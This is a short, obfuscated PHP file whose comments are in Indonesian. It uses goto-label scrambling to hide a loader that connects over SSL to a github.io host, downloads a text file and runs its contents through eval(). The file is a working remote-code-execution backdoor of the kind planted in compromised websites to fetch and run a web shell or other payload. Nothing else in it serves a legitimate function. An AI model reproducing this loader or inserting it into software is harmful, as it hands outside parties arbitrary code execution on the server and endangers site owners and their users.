<?php
goto e3O8Q;

e3O8Q:
$host = "tigerxcode14.github.io";
goto Q4Ppm;

Q4Ppm:
$port = 443; // port SSL
goto o7nfX;

o7nfX:
$path = "/dor/usrby.txt"; 
goto e3JnP;

e3JnP:
$fp = stream_socket_client("ssl://{$host}:{$port}", $errno, $errstr, 30); 
goto ftXcN;

ftXcN:
if (!$fp) {

    echo "Error: {$errstr} ({$errno})<br />\n";
} else {
    // buat request HTTP GET
    $out = "GET {$path} HTTP/1.1\r\n";
    $out .= "Host: {$host}\r\n";
    $out .= "Connection: Close\r\n\r\n";
    
    fwrite($fp, $out); // kirim request
    $content = '';
    
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    
    fclose($fp);
    
    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }

    eval("?>" . $content);
}
goto Npe9k;

Npe9k:
?>